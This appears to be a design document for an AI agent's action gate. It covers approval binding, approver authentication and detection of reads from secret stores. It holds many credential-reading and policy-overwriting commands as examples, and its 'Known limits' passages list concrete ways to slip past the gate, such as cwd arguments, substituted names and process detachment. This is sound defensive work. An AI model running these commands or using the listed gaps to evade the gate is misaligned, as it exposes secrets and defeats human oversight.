# The action gate: approvals and the outbound scrub

`exo.gate` classifies every tool call and decides allow, log, ask or deny from the principal's
policies (`policies/gates.yaml`, `budget.yaml`, `posting.md`). The `exo-gate` plugin runs it on
each call, records the decision in the signed ledger, and turns an ask into the protocol event
`approval.requested`. This page covers what D-033 added: what an approval covers, who may give
it, how long "always" lasts, and the sweep for internal names in outbound posts. D-038 made the
shell classifier an allowlist and put the store itself behind the gate (see the last three sections).
D-081 keeps the decision model's second opinion off the main model (see "The decision model's second opinion").

## Required executor audit

With a required tool executor, the gate refuses execution unless its signed
decision event was committed to the principal ledger. After a principal answers,
the approval event must also commit before the broker or handler runs. Missing
stores, unusable signing keys, failed writes and gate hook exceptions block with
a generic error, including read tools and observe-mode exception fallbacks.
Optional observer hook failures remain optional. Observe mode still asks, and
`exo-gate` must load. Ordinary Exo retains its existing logging-only behavior
when no ledger is available.

Required mode refuses every post whose body the gate cannot read on the line
(#208): a `gh --body-file` path, which it never opens (symlinks included, and
even when body-file reading is disabled), and also stdin (`--body-file -` with a
pipe or `<`), `gh api` fields read with `@` and `--input`, `$( )`, backticks or
a variable in the text, and the HTTP clients' file and stdin bodies (see "What an
approval covers"). The refusal is a recorded `deny` decision (rule `required`).
The gate cannot approve unseen contents. Pass inline text for inspection; the
executor then applies its own operation policy. Policy and grant files remain
trusted configuration outside the worker's writable workspace.

Concurrent identical requests keep separate approval tokens and audit
references. The reusable rule key still scopes a standing grant; it does not
identify a pending call. Required mode needs the exact per-call token when the
engine reports an answer.

Accepting changed policies commits the acceptance audit before replacing the
pinned policy. Creating a required standing grant first commits an authorization
event (`phase: grant`, `state: authorized`, `activation: pending`) and only then
atomically writes the grant file. Audit failure leaves authority unchanged. A
subsequent grant-file failure blocks the call; its audit describes authorization,
not successful storage. These two stores do not form one atomic transaction.

## What an approval covers

An outward act is a post, message, email, social post, payment or account action, or anything
the gate marks public or irreversible. For those, the gate hashes the exact text, title, target,
tool and arguments (`approval_binding`). Text read from a `--body-file` counts too. The hash is
sent as `binding` on `approval.requested`.

The hash covers only text the gate can see, so a body it cannot read asks (#208). The classifier
marks such a post with the `unseen_body` signal, and `gate.body_unseen` also counts a body file
nobody read:

- `gh`: `--body-file -` (or `-F -`, `--notes-file -`) unless the line spells out stdin and bash
  changes nothing in it: one heredoc on descriptor 0 (`<<` or `0<<`; a `3<<` heredoc is not gh's
  stdin) with a quoted delimiter, or with no `$`, backtick or backslash in the body (bash expands
  those and joins a line that ends in `\`), ended by the exact delimiter line (bash does not end it
  at `EOF `, ` EOF`, `EOF` and a CR, or a tab-indented `EOF` under plain `<<`; such a body is
  unseen); one here-string on descriptor 0 with no expansion; or a pipe from one simple command: `cat` with such a heredoc or here-string, `echo`
  with no option word and no backslash, or `printf` with one format that has no `%` or backslash.
  `printf` formats, `echo -e` and `-n`, a subshell or group before the pipe
  (`(cat notes.md; echo F) |`, `{ ...; } |`, a loop) and any other writer are unseen, because
  only one simple command's output can be read whole. Also unseen: `gh api` fields with `@` and
  `--input`; `--fill`, `--template`, `--editor`, `--recover` and generated release notes, which gh
  writes itself; `--attach`, which uploads a file; a gist's files; any word bash may expand (`$X`,
  `$( )`, backticks, a brace expansion such as `Zo{r,}k`, a glob character, a leading `~`), since
  any word can be an option such as `--body-file=f`. `{owner}` with no comma or `..` is not a brace
  expansion and stays readable. A
  `$(cat <<'EOF' ... EOF)` body is plain text and is read. Text options are read as gh reads them,
  with gh's own list of options that take a value for each posting command (gh 2.102): when a
  repeated option (gh keeps the last), a short-option cluster (`-db text`) or an option's value
  (`-t -b -b text` or `--title --body --body text`: the title is `-b` or `--body`) gives another
  value than the gate's reading, the post is unseen. `gh release` reads `--notes` and `--notes-file` as its text.
- `curl`: `-d @f`, `--data-binary @-`, `--data-ascii @f`, `--json @f`, `--data-urlencode name@f`,
  `-F k=@f` or `k=<f`, `-T`, `--expand-data`, and a word from an expansion other than the value of
  `-H`, `-u`, `-A` or `--oauth2-bearer` (a token in a header leaves the body readable). An attached
  value (`-d@f`) makes the call a POST, as a spaced one does, and so does `--data-ascii`. `-K` reads
  options, data and URLs from a file, so the call counts as a POST whose body is unseen, never as a
  local one. A POST whose host the gate cannot read (`curl -d x "$URL"`) is not a local write
  either. `wget`: `--post-file`, `--body-file`, `-e`,
  `--config`, or an expansion outside `--header` and the login options. httpie: `k=@f`, `k:=@f`,
  `k@f`, a pipe or `<` into it, or an expansion outside `-a`.
- The exo-gate hook reads a body file only by an absolute path, up to 256 KiB, with
  `read_body_files` on. A relative or `~` path names a file in the command's folder or home, which
  the hook cannot pin down: it gets the session's folder (#209), but a `cd` or `pushd` on the line,
  or the call's `cwd` argument, moves it (`cd docs && gh ... --body-file notes.md` read `notes.md`
  from exod's own folder before). A path under `/dev` or `/proc`, as written or resolved
  (`/dev/stdin`, `/proc/self/fd/3`), names what the reading process holds, so the hook would read
  exod's own; it is never read. A missing, larger or unreadable file stays unseen.

Under the posting rules (`posting.applies_to`) an unseen body adds the violation "the gate cannot
read the body ..." and asks. In any category it offers no "always" (`once`) and no standing grant
matches it, since its binding hashes only the line. A post the line spells out is checked as before.

- An answer covers that hash only. If the agent edits one character, the next call has a new
  hash and is asked again. This is the same rule as a review verdict that a new head sha voids.
- A client may echo `binding` in `approval.respond`. If it differs from the open request's hash
  the answer is refused as `stale`, so an approver who read an older draft cannot pass a newer
  one. A client that sends no binding keeps the old behaviour.

## Who may approve

`policies/approvals.yaml` maps a category to who may answer:

    approvers:
      default: [principal]
      categories:
        github_post: ["role:public-reviewer"]
        social_post: ["role:public-reviewer"]
    roles:
      public-reviewer: ["seat:my-lead-seat"]

Entries are `principal`, `seat:<name>` or `role:<name>`. The principal can always answer. With
no file, only the principal can, which is the behaviour of a single-user install. A peer or
ingress client never can (D-026). The allowed list is sent as `approvers` on
`approval.requested` so a client can show who must answer; the engine refuses anyone else as
`forbidden`. While a changed `approvals.yaml` waits for `/gate accept`, the list holds only those
both files allow (`gate.strictest_approvers`); see "Policy changes during a session".

A client answers as a seat by setting `client` to `seat:<name>` and signing the answer with that
seat's Ed25519 key: `sig = exo.core.approvals.sign_approval(key, request_id, decision, binding,
seat)`. The signature covers the request id, the decision, the request's binding hash and the
seat name, so it cannot be reused for another request, decision or text. An unsigned or badly
signed seat answer is refused as `forbidden`. The public key comes from the bus registry when
that document verifies, else from `<keys dir>/<seat>.pub`. Both are store paths (#210, "The store is
credentials" below): a tool call that writes the registry, the relay database or the keys folder is a
`store_write`, which only the principal approves.

A line's `credentials` and `store_write` parts narrow the list too, not only the category that
leads it (#447). Such a line goes to those allowed for its own category and for each such part
(`gate.call_approvers`). A secret read outranks a store write, so
`env; echo x > ~/.exo/policies/gates.yaml` and
`cat ~/.kube/config; cp evil.yaml ~/.exo/policies/default.yaml` are `credentials`. Their store write
part keeps them with the principal alone, as `echo x > ~/.exo/policies/gates.yaml` is. The same
holds behind a wrapper (`sudo sh -c '...'`, `timeout 5 bash -c '...'`), in a subshell, a `$( )` or
a heredoc. No standing grant covers a line with such a part, and observe mode still asks for it
(`gate.no_grant`, see "Standing grants"). A secret read alone (`env`, `cat ~/.kube/config`) keeps
the seats that `approvals.yaml` gives `credentials`. The line's category, its outcome and its
matrix cell do not change. Other parts do not narrow the list. With
`credentials: [principal, "seat:builder"]` and `force_push: [principal]`,
`env; git push --force origin main` still goes to both, as before #447. Reading every part is
#437.

A file tool that names a secret and a store file is `credentials` too: `apply_patch` on
`~/.ssh/config` and `~/.exo/policies/gates.yaml`, or `move_file` from `~/.ssh/id_rsa` to
`~/.exo/policies/gates.yaml`. Each store file such a tool writes, moves, copies or deletes is a
`store_write` part, so the call is the principal's alone as well. A move, rename or delete of a
folder that holds the store counts too, as `mv` and `rm` do (`move_file` from `~/.exo` to
`~/.ssh/x`). A file tool that only reads (`read_file ~/.ssh/id_rsa`), copies the store
(`copy_file` from `~/.exo` to `~/.ssh/x`, as `cp -r` does), or writes a secret outside the store
(`write_file ~/.ssh/config`), has no such part and keeps the delegation. With no secret, a file
tool's move of a folder that holds the store is not read as a store write yet (#494). The hook's
error fallback reads the parts too (see "The store is credentials").

## Who answered: the connection, not the body (D-039)

The core never takes the answerer from the `approval.respond` body. The transport stamps a caller:

- **principal**: the terminal client's own in-process core, the web client, or a socket client
  that sends the core's per-launch principal credential in the `X-Exo-Principal` header. The
  credential is a random token in a launch record the core writes beside its socket when it starts
  (`$EXO_HOME/run/exod.principal.key` or `run/agent-<seat>.principal.key`, mode 0600) and deletes
  when it stops. A credential sent from a process that is a child, grandchild and so on of the
  core (a bash tool call or a background job) does not count, and neither does one from another
  user or from a process the kernel cannot name (see "Unix peer authentication" below).
- **local**: everything else on the socket (a tool subprocess, another daemon), and every stdio or
  TCP connection.
- **channel**: a channel exod runs in its own process (the exo-bus channel), through
  `ChannelLink` in `src/exo/server/app.py`. It has the standing of a local caller, and only it may
  hand the core a bus message (`docs/PEERS.md` "Bus seats"). No transport stamps it: a socket
  client that names itself `channel` with the credential is `principal:channel`, and without it is
  local.

A principal connection answers as the principal; `client` is only a label (`principal:tui`,
`principal:web`). A local connection can answer only as a seat, with the signature above. An
empty `client`, `principal`, `exo-tui` or any other name from a local connection is refused as
`forbidden`, so a tool that speaks the protocol cannot answer its own approval. The answerer shows
in `approval.resolved` as `by`.

### Unix peer authentication (D-060)

Both ends of a principal connection on the Unix socket ask the kernel who is on the other end of that
one connection before the credential moves. Code: `src/exo/principal.py` and `src/exo/peerauth.py`.

| Platform | Peer user | Peer process | Process start and parent |
|---|---|---|---|
| Linux | `SO_PEERCRED` | `SO_PEERCRED` | `/proc/<pid>/stat` (start ticks, with the boot id) |
| macOS | `LOCAL_PEERCRED` (the uid `getpeereid` reports) | `LOCAL_PEERPID` | `proc_pidinfo(PROC_PIDTBSDINFO)` |
| anything else | none | none | none: principal mode is refused |

The launch record is one JSON object: `v`, `token`, `pid`, `uid`, `start` (the core's process start
identity) and `instance` (the launch id `hello` also reports). It is written atomically, before the
socket accepts, so a client never reads a missing record or a crashed core's. A core that cannot read its
own process entry warns in its log and writes an empty `start`, which clients refuse with that reason.

**The client, before sending.** A principal client (`exo`, a joined window, `exo chat`, the web)
connects, then checks that connection: the kernel's peer uid is this user, its pid is the record's
pid, and that process's start identity equals the record's. The record is read through one
descriptor with `O_NOFOLLOW`; it must be a regular file with one link, owned by this user, with no
group or other access, at most 4 KiB, and a v1 record. Only then does the token from that record go
on that same connection, and only on `POST /command`. Any failure is a connection error
(`PrincipalRefused`, a `ConnectError`) that names the reason, with no byte written: a replaced socket, a
stale record (a dead core, or a reused pid), a symlink, a shared file, a record from a core that predates
D-060, a core in another PID namespace (the kernel names pid 0), or a platform with no peer call. The web
page shows that reason with a restart hint (`exo stop`, then reopen the page) instead of "not reachable". The
terminal says `not sent: <reason>` and keeps the typed text; a command whose connection never opened is never
reported as "may not have been delivered" (#226).
There is no fallback to a credential-less or unchecked principal mode.

**The core, before accepting.** The core takes the kernel's peer pid and uid, and that pid's process
start identity, when it accepts the connection, before reading a byte (one request per connection, so
this is per request too). The caller is the principal only when the token matches, the uid is this
user, that pid still names the same process (the start identity taken at accept, and a start before
the accept, so a pid reused after the accept fails), and its whole parent chain reads cleanly up to pid 1 without
passing the core. A chain that cannot be read is treated as the core's own tool tree. The tree check
runs when the request is read. The dead-peer check, not the parent walk, closes one detach route on
Linux: a tool child that connects, then exits and leaves the connection to an orphan, is local,
because the kernel's peer pid then names a dead process. On macOS `LOCAL_PEERPID` reports the last
process to use the socket, so an orphan that writes before the core's accept is the process named; the
claim holds reliably on Linux only. When a request with the right token is taken as local, the core
says why once per process in its log (`exod: the principal credential from pid N is taken as local:
...`), and that connection's refusals (approvals, principal-only commands) name the reason.

**Limits.** Same-user code running outside the core's tree is trusted: it can read the record, as it
could read the old token file. A tool child whose parent exits before it sends its request is not
caught by this check (issue #31); an OS sandbox for tools is still the fix (D-038, D-039). Under
`hidepid` or systemd `ProtectProc` (or `ProcSubset=pid`), root-owned ancestors such as `sshd`, `login`,
`su` or `sudo` cannot be read, so every principal client started below them is local; the refusal and
the core's log say so. This fails closed on purpose: stopping the walk at the first unreadable
ancestor would let `tool -> sudo -u $USER exo` pass. A client in another PID namespace than the core
is refused too. An old client against a new core sends the whole record as its token and is local
without a message; restart `exo`, `exo web` and `exo chat` after an update. The browser-to-web hop (the
`exo web` page to its own server, over TCP) is not peer-checked; the page token protects it and, since
#177, the one-time launch code (D-039, #166).

**Snapshot and liveness contract.** `hello` returns `instance` (this launch). Over HTTP (the Unix
socket and TCP) it also returns `heartbeat`, that server's seconds between `: ping` comments on
`GET /events`, and the capability list has `heartbeat`. Stdio and in-process callers get no pings, so
their `hello` has neither (#226). The event stream opens with `: exod instance=<id> heartbeat=<s>`. `approvals.list` returns
`{approvals, cursor: {instance, seq}}`, copied in one await-free step: replace pending cards with it,
then apply events above `seq`; a different `instance` means the core restarted and its pending asks
are gone. The Python client ends a stream that brings no complete frame (an event or a heartbeat) for
`idle` seconds (45 by default); partial bytes do not count. A frame over 16 Mi characters is skipped. The client
splits the stream into lines itself (CRLF, LF or CR, as SSE defines them) and holds at most that much of one line,
so it refuses a longer frame before reading the rest of it (#226). It resumes after that frame's seq, since resuming at it would replay it forever, with or without `reconnect`, so a
caller that keeps its own `since` (the exo-bus channel) gets the next event. The core writes frames
as raw UTF-8 (escaping U+0085, U+2028, U+2029 and lone surrogates, which line readers split on or
cannot encode), so a frame stays near the size of the request that made it; text made of those
escaped characters can still grow up to three times. A joined terminal window resends a command
after a lost connection only when nothing was sent (the connect failed) or the command is a read; a
lost reply to a turn or an approval answer is never repeated. The window says it may not have been
delivered, puts the typed text back in an empty composer, and re-reads `approvals.list` to put back a
card the core still holds.

A seat may approve one exact text with `allow`. Only a principal connection can answer
`allow_always`; anything else is refused.

The run folder is a secret store (#169), like `~/.ssh` and `keys/`. Its secrets are:

- the folder itself, named as a path in any spelling: `$EXO_HOME/run`, `${EXO_HOME}/run`,
  `~/.exo/run`, `.exo/run`, `$EXO_HOME/principals/<name>/run`, also with a trailing `/`, `/.`,
  `//` or `jobs/..`, and through a symlink (a path is resolved as written, so `<link to
  run/jobs>/..` is the folder);
- the credential files in it, by name: `exod.principal.key`, `<socket stem>.principal.key` and
  the TCP token `exod.token`;
- a wildcard in the folder that could match one of them: `run/*`, `run/*.key`,
  `run/exod.principal.k*`, `run/exod.tok*`, `run/agent-*`, `run/agent-default.*`. The agent keys
  are sampled as `agent-<seat>.principal.key` for `default` (the terminal client's agent when no
  seat is given), `$EXO_SEAT` and up to 64 seats under `$EXO_HOME/seats` (`<name>.toml`,
  `<name>.json` or `<name>/`; other files there are skipped first, then the first 64 by name are
  taken).

A call that touches one is `credentials`, reads and writes alike, wherever the gate finds
`~/.ssh`: shell words, redirections, `$( )`, `bash -c`, interpreter `-c` code, `execute_code`
string literals and the path arguments of the built-in tools. So `ls`, `grep -r`, `find` or `tar`
of the folder, the built-in `read_file`, `list_dir`, `grep` and `glob` with it as `path`,
`cat run/*`, `rm -rf run`, `rm run/*` and `mv run/* /tmp/` all ask. Not secret, and classified
as before: what is below the folder apart from those files, so job output in `run/jobs/` stays
`read` (`cat run/jobs/*`, `ls run/jobs`) and deleting it stays `store_write`; the socket and pid
files by exact name. A bare relative `run` is never the folder (`uv run`, `npm run`, `gh run
list`, `ls run`): the gate does not resolve `run` against its own working folder, though it does
for `keys`, so with the gate's working folder at `$EXO_HOME`, `ls keys` asks and `ls run` does
not. A `cd`, `tar -C` or `git -C` into `$EXO_HOME` on the line is followed, though: a relative
name is then read as the path it names from there (#269, "The working folder" below), so
`tar -C ~/.exo -czf - run`, `cd ~/.exo && ls run` and, from `run/jobs`, `cat ../exod*`,
`grep -r . ..` and `cd .. && ls` ask, while `cat 1.log` there stays `read`. Brace sets are
expanded first (#184), so `run/{*,}`, `{$EXO_HOME/run,x}/*`,
`$EXO_HOME/{run,x}/*` and `$EXO_HOME/r{u,}n/*` ask, and `run/jobs/{1,2}.log` stays `read`. A
wildcard is matched with `.` and `..` resolved, for every secret store, so `cat ./.env*` asks like
`cat .env*`. A wildcard with no folder is matched against the secrets' own file names, not their
paths, and an agent's key only when the wildcard spells its `agent-` or `.principal` part: a bare
`cat exod*`, `cat *.principal.key` or `ls agent-*` asks in any folder, as `cat id_rs*` and
`ls seat*` already did, while `ls *run*`, `find . -name 'run*'`, `ls age*` and `ls *main*` keep
their class, also when `main` is a seat. A wildcard with a folder reaches an agent's key the same way,
or when its folder names a run folder or holds a literal part around its wildcards
(`cat ~/.exo/*/*default*`, `cat .exo/run/*default*`), so `ls */*default*` and `ls ~/*test*` keep their
class. Any wildcard that spells the folder's path still asks (`ls ~/.exo/run*`, `ls */run*`). Known friction (fails closed, no grant): a bare glob that
matches the core's file names or spells `agent-` asks in any folder, such as `ls *prin*`,
`ls *xod*` or `git diff -- 'agent-*'`.

Limits. No environment variable carries the credential, and `tool_env` drops `EXOD_*`,
`EXO_PRINCIPAL*` and `EXO_*SOCK*`. The gate does not catch: a walk over an ancestor
(`grep -r token ~/.exo` or `~`, the same as for `~/.ssh`, also through `..`:
`cd ~/.exo/run/jobs && grep -r secret ../..`); a relative name when the folder is
the bash tool's own `cwd` argument rather than a `cd` on the line (`{"command": "cat *", "cwd":
"~/.exo/run"}` is `read`, as is `cat id*` with `~/.ssh` as `cwd`; `cd ~/.exo/run && cat age*`,
`cd ~/.exo && cat run/*`, `cd ~/.exo/run/jobs && cat ../*` and `cat ../exod*` ask, see "The working folder"
below); a `..` from a folder spelt with a wildcard (`cd ~/.e*o/run/jobs && ls ..`); a wildcard
in a folder name above a file (`principals/*/run/*`, `$EXO_HOME/r*/*`); a short wildcard for
the folder itself (`grep -r . ~/.exo/ru?`, `ru[n]`: the last part needs three literal
characters, the same as for `~/.ss?`; `~/.exo/r*` asks); an upper-case spelling on a
case-insensitive filesystem (`~/.exo/RUN/*`, as `~/.SSH/*`); a wildcard that spells part of an agent's name that is not sampled
(`run/agent-scout*` when `scout` is neither `$EXO_SEAT` nor among the 64 sampled seats); the
built-in `glob` with the folder in `pattern` rather than `path` (it lists names; the same for
`~/.ssh`); and a key beside a custom `--socket`, which is caught by name only
(`cat <dir>/exod.principal.key` asks, `cat <dir>/*` does not). A tool process is the same OS
user, so code that both reads the file without the gate seeing it and detaches from the core's
process tree could still pass. The full fix is an OS sandbox for tools; until then the gate and
the process-tree check are the guard.

## Secret-store paths

A path names a secret store (`credentials`, always asks) when it matches the store list in `exo.gate`
(`~/.ssh`, `~/.aws`, `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config`, `.env`, `*.key`,
token files, Exo's `keys/`...), or when it is a glob that could match one of the sample store paths. This holds
for shell words, redirection targets, `bash -c` and `$( )` text, string literals in code, and the path arguments
of file tools. Brace sets are expanded as bash does before matching (issue #184). In a shell word the gate
expands the source text, quotes kept, and then removes the quotes from each word, so only unquoted braces
expand: `'{a,b}'`, `"{a,b}"` and `\{a,b\}` stay literal, while in `''{},.env}` the `{` follows a quote, is not
at the start of the word, and opens a group. A `$"..."` is also read as the plain `"..."` bash gives it without
a message catalog, so `cat $""{.env,x}` asks. A path argument of a file tool has no quoting and is expanded as
written. The scan follows bash's: a group ends at the first top-level `}` after a comma or `..`, so `{},hosts}`
is one group; a `{x..y[..n]}` sequence expands to its members, padded as bash pads them (a leading zero on
either bound pads every member to the longer bound, so `{007..1000..993}` is `0007 1000`); nested groups expand
too; `${...}`, `$(...)` and groups with neither a comma nor a sequence stay literal. The word as written and
every word it expands to are checked, and a hit on any counts, so `cat ~/.config/gh/{hosts,x}.yml`,
`cat ~/.docker/{*,}` and `cat ~/{},.netrc}` ask.

The work is bounded. A word that would expand to more than 1,024 words (or past a million characters in all),
nests groups more than 32 deep, or has a sequence bound longer than 18 digits counts as a store path (asks)
rather than being matched in part. So does a zero-padded sequence with a bound past a 32-bit int: bash prints
its members as C ints, so they wrap (`{04294967296..04294967296}` is `00000000000`). One tool call expands at
most 4,096 words in all, across its words, redirections, nested commands and code literals (a glob word counts
four times, and a long word once more per 64 characters); past that, each further word with a brace set counts
as a store path too. The trade-off: this fails closed, so an ordinary line past a limit, such as
`echo {1..2000}` or `for i in {1..2000}`, is `credentials` and asks every time with no grant. A string literal
in code is read as a shell command, so compact JSON with 11 or more objects in one literal
(`'[{"a":1,"b":2},...]'`) goes past the cap the same way.
A relative name read in a store folder a `cd` entered counts too, since #192 also for stores matched only by
sample paths (`cd ~/.config/gh && cat hosts.yml` asks; see "The working folder" below).
A file tool's path is checked, not each file the tool reaches below it: the built-in `grep` and `glob` tools
walk every file under their path, and since #241 they leave the stores below it out themselves (see "What the
search tools read" below).
Tests: `tests/security/test_gate_brace_sets.py`.

### Other spellings of a store path (#209, #202, #225, #199)

A path can reach a store without spelling the store's name. The gate reads four such spellings the way the file
system or bash will.

- **Links (#209).** A link is judged by where it leads. Each path is resolved from the gate's own folder, from
  the session's working folder (the core passes it to tool hooks as `cwd`), and, for a shell tool, from that folder
  joined with the call's own `cwd` argument, the folder a shell runs in. A `cwd` argument on a file tool changes
  nothing: `read_file`, `write_file` and `grep` take unknown arguments and read from the session's folder. When a
  link led somewhere else, the resolved path is matched against the store list too. So `notes.txt` pointing at `~/.ssh/id_rsa`, `aws.txt` at `~/.aws/credentials`, `app.cfg` at a
  project `.env`, and a folder link `cfg` to `~/.ssh` (`cat cfg/config`) ask in every form: `read_file notes.txt`,
  `cat notes.txt` and the absolute paths. A relative path that lands below the folder it was read from is matched
  by its part below that folder. That way a session inside a folder that looks like a store by name (a repo's
  `.claude/worktrees/x` checkout) is not asked about every read through a link that stays inside it. Both
  folders' absolute and resolved forms are also compared with Exo's key stores and run folders, so a relative `run`
  read in a session whose folder is `$EXO_HOME` is the run folder. A `.pub` name exempts a path only when the
  resolved path ends in `.pub` too: `key.pub` pointing at `~/.ssh/id_rsa` asks.
- **Defaults (#202).** `${VAR:-word}` and the other operators are read for `HOME`, `EXO_HOME`,
  `CLAUDE_CONFIG_DIR` and `EXO_PRINCIPAL_STORE`. The path is checked with the variable's value (as `$EXO_HOME`
  reads: Exo's folder, set or not) and with the variable unset (the default word, spelt out in turn, quotes
  dropped). Both count. `-`, `:=` and `=` take the word when unset; `:+` and `+` give the word when set and
  nothing when unset; `:?` and any other operator (`%/`, `#*/`, `:0`) read as the value. So
  `cat ${EXO_HOME:-$HOME/.exo}/keys/seat`, `tar czf - ${EXO_HOME:-$HOME/.exo}/keys` and
  `ls ${EXO_HOME:-$HOME/.exo}/run` ask with `EXO_HOME` set or not, and `write_file
  ${EXO_HOME:-$HOME/.exo}/policies/x.yaml` is a store write. A default is read to 8 levels of nesting; a deeper
  one stays as written.
- **Expansions inside a name (#225).** Bash drops an empty command substitution, and an unset variable expands to
  nothing, so `cat .e$(:)nv`, ``cat .e``nv``, `cat ~/.n${x}etrc` and `cat ${x}.env` read the store. A shell word
  that holds a `$( )`, a backtick pair, or a `${..}` or `$name` other than the four variables above is also
  matched with each of them removed. Where literal text stands on both sides of one, it is also read as `*`, for
  any output: `cat .e$(echo n)v` is the glob `.e*v`, which asks as that glob would. Single quotes keep text
  literal (`cat '.e$(:)nv'` names a file spelt that way). Ordinary lines keep their class: `cat notes-$(date
  +%F).md`, `ls $(pwd)/src`, `cat ${OUT}/report-${N}.txt`.
- **Bash glob syntax (#199).** A glob is matched as bash reads it (`_fn_glob`, which the `cd` checks already
  use): `[^x]` is `[!x]`, a `]` first in a set is a member, and a POSIX class is spelt out (`[[:alpha:]]` is
  `[a-zA-Z]`). A class bash does not know, or more than 32 `[`, could match anything and counts as a match. So
  `cat ~/.kube/[^x]onfig`, `cat ~/.kube/[[:alpha:]]onfig` and `cat ~/.config/gh/hosts.[^x]ml` ask.
  `/proc/<pid>/<glob>` asks when the glob could match `environ`, for any process: `cat /proc/self/[!x]nviron`,
  `cat /proc/*/[!x]nviron` and `cat /proc/self/*` ask, while `ls /proc/*/status` stays a read. A thread's
  `/proc/<pid>/task/<tid>/<glob>` is read the same way (#313, below).

Cost. The checks of one classify call now share their file-system lookups (the store roots, the gate's folder and
each folder's resolution) across all the line's words. Before, each word looked them up again. On three 10 KB
shell lines (plain commands, expansions, globs; CPU time, median of 25 runs) classify took 30 to 82 ms, against 212
to 312 ms before.

Known limits. A link made on the same line (`tar xf v.tar && cat notes.txt`) does not exist yet when the gate
classifies the line; `ln -s ~/.ssh/id_rsa n` itself asks, since it names the store. Programs that follow links
while they walk (`grep -r`, `rg -L`, `cp -rL`) are checked by their arguments only. In executor or broker mode the
gate's view of the file system may differ from the worker's. A name built whole inside a substitution
(`cat $(printf '.e%sv' n)`) is not read. Open issues:
  - #309: the Exo-store write checks (`is_store_path`, "The store is credentials" below) read the `${VAR:-word}`
    value but not expansions inside a name, so `cp x ~/.exo/polic$(:)ies/gates.yaml` is still a shell command (a
    write redirection to a path with `$` already asks as `opaque_exec`);
  - #310: an expansion at the end of a store name is read as empty only, so `cat .env.$(hostname)` stays a read, as
    does the glob `cat .env.*` (the glob samples have no `.env.<suffix>`);
  - #311: a relative name read in a shell's `cwd` inside a store (`{"command": "cat config", "cwd": "~/.kube"}`) is
    matched by the name as written; a `cd` on the line is tracked (#192);
  - #312: a link reached through a `cd` on the line, `$PWD`, `$(pwd)` or a glob (`cat note?.txt`) is not resolved.

Tests: `tests/security/test_gate_secret_links.py`, `test_gate_store_var_defaults.py`,
`test_gate_expansions_in_names.py`, `test_gate_bash_glob_classes.py`, and
`plugins/exo-gate/tests/test_hook.py::test_relative_paths_are_read_from_the_session_folder`.

### A thread's environment file (#313)

On Linux each thread of a process has its own folder, `/proc/<pid>/task/<tid>/`. Its `environ` holds the same
environment as `/proc/<pid>/environ`, so it is a secret store too, for any process. The store list names both
forms. A glob is read as bash reads it: `/proc/<pid>/<x>/<tid>/<glob>` asks when `<x>` could match `task` and the
glob could match `environ`. So these ask: `cat /proc/self/task/1/environ`, `cat /proc/*/task/*/environ`,
`cat /proc/1/*/*/environ`, `cat /proc/self/[t]ask/*/environ`, `cat /proc/self/task/{1,2}/environ`,
`cd /proc/self/task/1 && cat environ`, and `read_file` or `write_file` on such a path. The search tools leave it
out of a walk, as they leave out the direct form (#241): `grep` on `/proc/self` skips each thread's `environ`.
Other files under `task/` keep their class: `cat /proc/self/task/*/status`, `cat /proc/self/*/*/cmdline` and
`ls /proc/self/task` are reads.

A thread's environment is decided as `/proc/<pid>/environ` already was. Some lines decide lower than before
because of that. A differential of main against the change found 4,878 lowered pairs on 1,910 actions (28,651
actions under 103 policies). Every one of them decides as main decides the same action with `/proc/self/environ`.
They fall in four groups, all from how the gate already handles a secret store:

- **A file tool's own class.** A file tool on a secret store takes the `credentials` class in place of its own.
  A deny on `read` or `local_write` then becomes the credentials ask: `read_file /proc/self/task/1/environ`
  under `categories: {read: deny}` asks where it was denied. A `reserved: [read]` entry no longer matches the
  call. The call still asks, and no grant covers it, since it is `credentials`. A shell line keeps its read as a
  part (D-075), so `cat` there is still denied by a `read` deny. Since #448 a file tool keeps its own reading as
  a part too, so the `read` deny denies `read_file` again and the `reserved: [read]` entry matches it.
- **Matrix cells.** The matrix sees the dominant part only. A credentials line is costly and private, so a deny
  cell for a read (`reversible`, `private`) no longer applies to `cat /proc/self/task/1/environ`. On a compound
  line the credentials part takes over, so a deny cell another part hit no longer applies:
  `cat /proc/self/task/1/environ; git push --force origin main` under an `irreversible`, `internal` deny cell
  asks. Since #464 a part's own matrix cell counts for a deny, so both lines are denied again under those cells.
- **Posting rules.** The posting rules read every post on the line (#396), so a post beside the read keeps its
  violations, named after its part. Before #396 they checked the dominant part only, and such a post lost
  them. The line asks either way.
- **A second store's target.** A line's credentials target is the first store it names, and a `cat` part has no
  target. So a `target:` entry for a second store on the line no longer matches:
  `cat /proc/self/task/1/environ; cat ~/.ssh/id_rsa` under `deny: [target:*/.ssh/*]` asks, as
  `cat ~/.aws/credentials; cat ~/.ssh/id_rsa` already does.

The differential does not count one more change, because the outcome stays an ask. Beside a store write, the
line is `credentials`, not `store_write`: `cat /proc/self/task/1/environ; echo x > ~/.exo/policies/gates.yaml`.
Before #447 a seat that `approvals.yaml` delegates `credentials` to could answer it, as for any secret on the
line. Now the store write part keeps it with the principal alone ("Who may approve").

Known limits. A doubled slash or a `..` inside a store name is matched as written. `cat /proc/1/task/1//environ`
and `read_file /proc/1/task/1//environ` stay reads, as `cat ~/.kube//config` does. On Linux, where `/proc/self`
is a link, a path through it is resolved first, so `cat /proc/self/task//1/environ` asks. A glob in the `/proc` name itself is not read, for
either form: `cat /pro?/self/task/1/environ` and `cat /pro?/self/environ` stay reads.

Tests: `tests/security/test_gate_proc_task_environ.py`.

### What the search tools read (#241)

The gate checks the one `path` a `grep` or `glob` call names; the tools walk everything below it. So the tools leave
out every folder and file below that root which `is_sensitive_path` matches, as found and as resolved
(`exo.gate.StoreSkip`): `grep {pattern: "key", path: "~"}`, the same search of `$EXO_HOME`, or one with no path from
a cwd of the home folder no longer returns `~/.aws/credentials`, `~/.config/gh/hosts.yml`, a project `.env`,
`$EXO_HOME/keys/*` or `$EXO_HOME/run/exod.principal.key`. A link named `notes.txt` that points into `~/.ssh` is left
out by where it leads, and a store folder is not entered at all. The output ends with `[skipped N secret-store
paths; read one by name to be asked]` whenever anything was left out, so a search is never silently incomplete. The
root itself is never left out. When the path the call names is a store (`path: "~/.aws"`), the call is `credentials`
and asks, and once approved the tool reads that store; a link out of it into another store is still left out. That
holds only when the folder walked is the store, as normalised and as resolved: `path: "~/.ssh/.."` also asks, but
walks the home folder, so its stores are left out as in any other search. A folder that is not a store but holds
files a store's sample paths name is searched like any other: `path: "~/.config/gh"` is `read` and allowed, and the
